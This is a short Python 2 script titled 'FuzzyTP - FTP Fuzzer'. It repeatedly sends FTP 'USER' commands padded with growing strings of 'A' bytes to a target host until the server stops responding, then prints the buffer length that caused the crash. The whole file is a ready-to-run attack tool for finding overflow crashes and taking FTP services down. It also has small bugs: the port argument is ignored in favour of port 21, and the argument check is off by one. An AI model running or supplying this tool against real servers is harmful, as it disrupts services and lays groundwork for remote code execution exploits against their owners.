#!/usr/bin/python
 # -*- coding: utf-8 -*- 
 
import sys, socket
from time import sleep

print '''

███████╗██╗   ██╗███████╗███████╗██╗   ██╗████████╗██████╗ 
██╔════╝██║   ██║╚══███╔╝╚══███╔╝╚██╗ ██╔╝╚══██╔══╝██╔══██╗
█████╗  ██║   ██║  ███╔╝   ███╔╝  ╚████╔╝    ██║   ██████╔╝
██╔══╝  ██║   ██║ ███╔╝   ███╔╝    ╚██╔╝     ██║   ██╔═══╝ 
██║     ╚██████╔╝███████╗███████╗   ██║      ██║   ██║     
╚═╝      ╚═════╝ ╚══════╝╚══════╝   ╚═╝      ╚═╝   ╚═╝   


name:       FuzzyTP - FTP Fuzzer 
author:     andmuchmore
email:      andmuchmore@exploit.design
date:       21/01/16
web:        http://www.exploit.design/

'''
 

if len(sys.argv) < 3:
    print "------------------------------------------------------------"
    print "usage:      ./fuzzyTP.py target port buffer_start increment "
    print "example:    ./fuzzyTP.py 127.0.0.1 21 200 10 "
    print "------------------------------------------------------------"
    sys.exit()
    
target = sys.argv[1]
port = sys.argv[2]
numbers = int(sys.argv[3])
buff = '\x41'*numbers
increment = int(sys.argv[4])
 
while True:

  try:

    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.settimeout(2)
    s.connect((target,21))
    s.recv(1024)
 
    print "Sending buffer with length: "+str(len(buff))

    s.send("USER "+buff+"\r\n")
    s.close()
    sleep(1)

    buff = buff + '\x41'*increment
 
 
  except:
    if len(buff)-numbers == 0:
      print "[+] Exploit failed "
    else:
      print "[+] Crash occured with buffer length: "+str(len(buff)-increment)
    sys.exit()